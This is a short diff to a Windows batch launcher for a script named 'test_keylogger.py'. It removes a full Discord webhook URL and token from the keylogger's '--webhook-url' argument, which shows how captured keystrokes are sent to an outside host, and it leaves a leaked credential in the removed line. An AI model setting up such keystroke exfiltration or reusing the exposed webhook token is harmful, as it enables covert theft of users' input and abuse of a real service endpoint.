@@ -14,7 +14,7 @@ echo Cikis icin Ctrl+C
 echo.
 
 python "%~dp0test_keylogger.py" ^
-  --webhook-url "https://discordapp.com/api/webhooks/1524218947371794464/DUk2YDIuqgnIJTMDt0WpE3mIdDaniNVT2MdTQq2ebI-Wm1MfE7yEtCGNC3DYPWcPuh1M"
+  --webhook-url ""
 
 echo.
 echo ============================
